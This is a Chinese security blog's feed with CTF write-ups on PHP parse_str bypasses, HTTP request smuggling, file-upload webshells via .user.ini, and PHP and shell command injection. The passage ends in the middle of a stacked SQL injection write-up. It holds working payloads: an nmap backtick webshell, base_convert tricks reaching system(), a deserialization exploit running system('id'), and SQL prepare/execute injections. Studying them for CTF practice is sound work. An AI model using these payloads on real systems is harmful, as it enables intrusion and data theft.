bar foo_bar foo%5bbar foo[bar foo_bar 直观的看下parser_str函数如何处理字符串： 下面有个脚本，遍历了所有字符，以foo_bar为例，遍历了三个位置php在解析时的不同 1234567891011121314151617181920&lt;?phpforeach( [ &quot;&#123;chr&#125;foo_bar&quot;, &quot;foo&#123;chr&#125;bar&quot;, &quot;foo_bar&#123;chr&#125;&quot; ] as $k =&gt; $arg) &#123; for($i=0;$i&lt;=255;$i++) &#123; // echo &quot;\\033[999D\\033[K\\r&quot;; // echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;\\n&quot;; parse_str(str_replace(&quot;&#123;chr&#125;&quot;,chr($i),$arg).&quot;=bla&quot;,$o); usleep(5000); if(isset($o[&quot;foo_bar&quot;])) &#123; // echo &quot;\\033[999D\\033[K\\r&quot;; echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;; &#125; &#125; // echo &quot;\\033[999D\\033[K\\r&quot;; echo &quot;\\n&quot;;&#125; 初步试了下,发现和脚本结果一样，发现三个位置的差别： 第一个位置为%20,%26,%2b时都会忽略 第二个位置为%20,%2b,%2e,%5b都会替换成_，即%5f 第三个位置为%00,%26,%3d时都会忽略 后来发现，变量名中有%20,%2b,%2e,%5b都会替换成_，即%5f 参考： https://www.freebuf.com/articles/web/213359.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"http://www.moonback.xyz/tags/bypass/"}]},{"title":"http走私学习","slug":"http走私学习","date":"2020-01-16T16:15:59.000Z","updated":"2020-01-20T14:30:49.391Z","comments":true,"path":"2020/01/17/http走私学习/","link":"","permalink":"http://www.moonback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/","excerpt":"本篇博客主要介绍了http走私相关内容！","text":"本篇博客主要介绍了http走私相关内容！ 什么是http走私？HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。 为什么会产生http走私？请求走私漏洞成因前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。 大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length标头和Transfer-Encoding标头。 同时使用两种不同的方法时，Content-Length无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。 http1.1的两个特性在HTTP1.1中，增加了Keep-Alive和Pipeline这两个特性。 所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。 有了Keep-Alive之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端 http走私类型HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为： CL.CL：前端服务器使用Content-Length标头，后端服务器也使用Content-Length标头。 CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。 TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。 TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。 HTTP请求走私攻击的五种方式CL不为0所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。 构造请求示例： 1234567GET / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n\\r\\n 1\\r\\n&#96;是换行的意思，windows的换行是&#96;\\r\\n&#96;，unix的是&#96;\\n&#96;，mac的是&#96;\\r 攻击流程：前端服务器收到该请求，读取Content-Length，判断这是一个完整的请求。然后转发给后端服务器，后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是： 第一个： 12GET / HTTP/1.1\\r\\nHost: test.com\\r\\n 第二个： 12GET / secret HTTP/1.1\\r\\nHost: test.com\\r\\n 所以造成了请求走私。 CL-CLRFC7230规范 在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。 有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。构造请求示例： 1234567POST / HTTP/1.1\\r\\nHost: test.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na 攻击流程：中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。如果此时有一个其他的正常用户对服务器进行了请求： 12GET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n 因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是： 12aGET /index.html HTTP/1.1\\r\\nHost: test.com\\r\\n 这时，用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。 但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？所以想到前面所说的RFC2616规范 如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length。 所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。 CL-TECL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。 chunk传输数据(size的值由16进制表示) 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size &#x3D; 0][\\r\\n][\\r\\n] chunked编码参考：http协议中content-length 以及chunked编码分析构造请求示例： 12345678910POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Connection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\na 连续发送几次请求就可以获得响应。攻击流程：由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是 1230\\r\\n\\r\\na 当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到 120\\r\\n\\r\\n 认为已经读取到结尾了。但剩下的字母a就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求： 123aPOST / HTTP/1.1\\r\\nHost: test.com\\r\\n...... 服务器在解析时就会产生报错了，从而造成HTTP请求走私。 TE-CLTE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding请求头，后端服务器处理Content-Length请求头。构造请求示例： 1234567891011POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n12\\r\\naPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到 120\\r\\n\\r\\n 认为是读取完毕了。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，因为请求体的长度为4.也就是当它读取完 112\\r\\n 就认为这个请求已经结束了。后面的数据就认为是另一个请求： 1234aPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 成功报错，造成HTTP请求走私。 TE-TETE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理Transfer-Encoding请求头。在某种意义上这还是CL-TE或者TE-CL。构造请求示例： 123456789101112131415POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: cow\\r\\n\\r\\n5c\\r\\naPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到 120\\r\\n\\r\\n 认为是读取结束。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理Transfer-encoding请求头，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。读取到 15c\\r\\n 认为是读取完毕了。后面的数据就认为是另一个请求： 1234567aPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n 成功报错，造成HTTP请求走私。 实例参见嘶吼ctf easy calc:https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc 参考： https://xz.aliyun.com/t/6654#toc-4 https://paper.seebug.org/1048/#31-cl0get","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"http走私","slug":"http走私","permalink":"http://www.moonback.xyz/tags/http%E8%B5%B0%E7%A7%81/"}]},{"title":"buuctf刷题-文件上传篇","slug":"buuctf刷题-文件上传篇","date":"2020-01-16T10:38:19.000Z","updated":"2020-10-11T12:21:29.868Z","comments":true,"path":"2020/01/16/buuctf刷题-文件上传篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/","excerpt":"本篇博客主要介绍了BUUCTF上web题中文件上传部分的writeup，持续更新中！","text":"本篇博客主要介绍了BUUCTF上web题中文件上传部分的writeup，持续更新中！ [SUCTF 2019]CheckInwriteup本题主要考察了对.user.ini的使用 问题来了，什么是.user.ini？ 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 在模式为PHP_INI_USER的配置项提到了.user.ini，那么这是个什么配置文件？ php配置项中有两个比较有意思的项（下图第一、四个）： auto_append_file、auto_prepend_file这两个配置是什么意思呢？ auto_prepend_file的意思是指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： auto_prepend_file=01.gif 这样的活在访问同目录下的.php后缀的文件时就会把01.gif包含进去 所以，.user.ini的利用条件如下： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 废话少说，开始解题！ 首先先上传一个.user.ini文件 再上传一个图片马，为了测试先写个phpinfo() 访问目录下的index.php，成功返回 上传一句话，蚁剑连，发现根目录/flag，成功解题 BUUCTF上有源码,分析一波 123456789101112131415161718192021222324252627282930313233&lt;?php// error_reporting(0);$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123; $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) &#123; die(&quot;filesize too big!&quot;); &#125; if (!$name) &#123; die(&quot;filename cannot be empty!&quot;); &#125; $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123; //黑名单，对ph和htacess忽略大小写过滤 die(&quot;illegal suffix!&quot;); &#125; if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123; //读取文件，过滤&lt;?,用&lt;script language=&#x27;php&#x27;&gt;&lt;script/&gt;绕过 die(&quot;&amp;lt;? in contents!&quot;); &#125; $image_type = exif_imagetype($tmp_name); //文件头检测，加GIF89a绕过 if (!$image_type) &#123; die(&quot;exif_imagetype:not image!&quot;); &#125; $upload_file_path = $userdir . &quot;/&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;; echo &#x27;Your files : &lt;br&gt;&#x27;; var_dump(scandir($userdir));&#125; [ACTF2020 新生赛]Upload查看源码发现可以上传，将鼠标移到中间就可以上传了 前端有js检验，直接上传图片马改后缀名，上传php可以大小写，但不能成功解析，php3,php5也不能解析 最后发现phtml可以解析，getshell后在上传上层目录发现.htaccess 123&lt;FilesMatch \\.phtml$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.moonback.xyz/tags/buuctf/"},{"name":"文件上传","slug":"文件上传","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf刷题-代码命令注入篇","slug":"buuctf刷题-代码命令注入篇","date":"2020-01-16T09:59:46.000Z","updated":"2021-03-09T06:13:47.136Z","comments":true,"path":"2020/01/16/buuctf刷题-代码命令注入篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/","excerpt":"本篇博客主要介绍了buuctf上web部分代码注入和命令执行相关题目的writeup！持续更新中！","text":"本篇博客主要介绍了buuctf上web部分代码注入和命令执行相关题目的writeup！持续更新中！ [RoarCTF 2019]Easy Calcwriteup打开查看源码发现是通过GET请求calc.php来获取答案的，直接访问能看到源码 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 先介绍一下PHP的字符串解析特性，PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事： 删除空白符 将某些字符转换为下划线（包括空格） 以这题为例，我们可以用类似下面的payload来绕过waf，waf在哪？我也不知道，刚开始我以为是用php写的waf，找了好久没找到，后来看大佬们的博客才发现并不是 waf可能不允许传递传递的num参数的值有字母，我们就可以用%20num来传递，这样waf那边解析的就是%20num这个参数，而在php那里解析的就是num这个参数 1calc.php?%20num= 所以我们可以找一下flag文件位置，查看flag 123calc.php?%20num=var_dump(scandir(chr(47))) #查看flag位置 calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) #读flag 我们还可以利用无参数函数来构造payload 还可以用http走私来构造，具体参见：https://www.moonback.xyz/2020/01/17/http走私学习/[](https://www.moonback.xyz/2020/01/17/http走私学习/) 我们就可以构造这种，在请求头里加上下面内容，并加上几个回车 1234Transfer-Encoding: chunked 参考： http://62.234.60.226/2019/10/19/RoarCTF-wp.html [CISCN 2019 初赛]Love Mathwriteup源码： 12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; php转字符串最常用的函数hex2bin发现不在白名单 但是我们可以尝试构造一个 发现了 构造流程： 12345678910111213&lt;?phpecho base_convert(&quot;hex2bin&quot;,36,10).&quot;\\n&quot;;echo base_convert(37907361743,10,36).&quot;\\n&quot;;echo bin2hex(&quot;_GET&quot;).&quot;\\n&quot;;echo hex2bin(&#x27;5f474554&#x27;).&quot;\\n&quot;;echo hexdec(&#x27;5f474554&#x27;).&quot;\\n&quot;;echo dechex(1598506324).&quot;\\n&quot;;echo hex2bin(dechex(1598506324)).&quot;\\n&quot;;echo base_convert(37907361743,10,36)(dechex(1598506324));// $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;) 还有其他payload: 12$pi&#x3D;base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)&#x2F;&#x2F; exec(getallheaders()&#123;1&#125;) 12base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))&#x2F;&#x2F; system(&#39;cat *&#39;) 一个fuzz脚本： 12345678910111213&lt;?phperror_reporting(0);$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];for($k=1;$k&lt;=sizeof($payload);$k++)&#123; for($i = 0;$i &lt; 9; $i++)&#123; for($j = 0;$j &lt;=9;$j++)&#123; $exp = $payload[$k] ^ $i.$j; echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;\\n&quot;; &#125; &#125;&#125; [网鼎杯 2020 朱雀组]phpwebwriteup命名空间绕过所有限制 源码： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 或者反序列化 exp: 1234567&lt;?phpclass Test &#123; var $p = &quot;id&quot;; var $func = &quot;system&quot;;&#125;$a =new Test;echo serialize($a); 参考： https://www.cnblogs.com/20175211lyz/p/11588219.html [网鼎杯 2020 朱雀组]Nmapwriteup和这个类似：https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/ 不过这里过滤了 php 短标签 加上phtml绕过 payload: 1&#39; &lt;?&#x3D;&#96;$_POST[1]&#96;?&gt; -oG hack.phtml &#39; 关键代码： 123456789101112131415161718192021222324&lt;?require(&#x27;settings.php&#x27;);set_time_limit(0);if (isset($_POST[&#x27;host&#x27;])): if (!defined(&#x27;WEB_SCANS&#x27;)) &#123; die(&#x27;Web scans disabled&#x27;); &#125; $host = $_POST[&#x27;host&#x27;]; if(stripos($host,&#x27;php&#x27;)!==false)&#123; die(&quot;Hacker...&quot;); &#125; $host = escapeshellarg($host); $host = escapeshellcmd($host); $filename = substr(md5(time() . rand(1, 10)), 0, 5); $command = &quot;nmap &quot;. NMAP_ARGS . &quot; -oX &quot; . RESULTS_PATH . $filename . &quot; &quot; . $host; $result_scan = shell_exec($command); if (is_null($result_scan)) &#123; die(&#x27;Something went wrong&#x27;); &#125; else &#123; header(&#x27;Location: result.php?f=&#x27; . $filename); &#125;else:?&gt; nmap的输出文件选项： -oN 标准保存 -oX XML保存 -oG Grep保存 -oA 保存到所有格式 -append-output 补充保存文件 [FBCTF2019]RCEServicewriteup测了半天啥都没测出来 搜了下wp 源码 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; 过滤的东西真多 看下正则开头任意字符 可有可无且不包括换行 结尾任意字符 同样可有可无且不包括换行 中间的字符太多了 包括换行 这样匹配 group为点 中间加个换行 还匹配 只不过group变成了换行 再加一个换行就不匹配了 列文件 1?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;ls&quot;%0a&#125; 查看文件发现不行 1?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;cat index.php&quot;%0a&#125; 猜测有可能是putenv(&#39;PATH=/home/rceservice/jail&#39;)的原因 使用/bin/cat 可以 查看flag 1?cmd&#x3D;&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.moonback.xyz/tags/buuctf/"},{"name":"代码注入","slug":"代码注入","permalink":"http://www.moonback.xyz/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"命令执行","slug":"命令执行","permalink":"http://www.moonback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"buuctf刷题-sql注入篇","slug":"buuctf刷题-sql注入篇","date":"2020-01-16T07:52:41.000Z","updated":"2021-04-04T11:00:14.204Z","comments":true,"path":"2020/01/16/buuctf刷题-sql注入篇/","link":"","permalink":"http://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/","excerpt":"本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！","text":"本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！ [强网杯 2019]随便注writeup可以看到过滤了很多东西 这题考察的是堆叠注入，因此我们可以先查询下数据库 不绕弯子，flag在supersqli里的1919810931114514表里，现在有两种方法可以得到flag 方式1使用prepare和execute来构造语句从而绕过过滤，payload如下： 1?inject=1&#x27;%3BSet%40a%3D0x73656c656374202a2066726f6d20603139313938313039333131313435313460%3Bprepare+b+from+%40a%3Bexecute+b%3B%23 url解码后是： 11&#x27;;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare b from @a;execute b;# 其中那段16进制字符串的意思是 1select * from `1919810931114514` 类似的payload还有 1&#x27;;use supersqli;set @sql=concat(&#x27;s&#x27;,&#x27;elect `flag` from `1919810931114514`&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1; 方式2这种思路算是骚套路了 